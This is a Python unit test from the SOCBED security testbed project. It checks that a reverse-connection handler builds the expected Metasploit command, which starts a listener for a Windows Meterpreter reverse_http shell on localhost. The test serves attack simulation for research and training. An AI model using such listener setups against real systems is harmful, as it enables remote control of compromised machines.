# Copyright 2016-2021 Fraunhofer FKIE
#
# This file is part of SOCBED.
#
# SOCBED is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# SOCBED is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with SOCBED. If not, see <http://www.gnu.org/licenses/>.


from attacks.reverseconnectionhandler import ReverseConnectionHandler


class TestReverseConnectionHandler:
    handler = ReverseConnectionHandler(None, "127.0.0.1", "80")

    def test_msf_command(self):
        msf_command = self.handler._msf_command()
        expected_msf_command = (
            "msfconsole --exec-command "
            "\""
            "use exploit/multi/handler;"
            "set payload windows/x64/meterpreter/reverse_http;"
            "set lhost 127.0.0.1;"
            "set lport 80;"
            "set ReverseListenerBindAddress 127.0.0.1;"
            "set ListenerTimeout 330;"
            "exploit;"
            "\"")
        assert msf_command == expected_msf_command
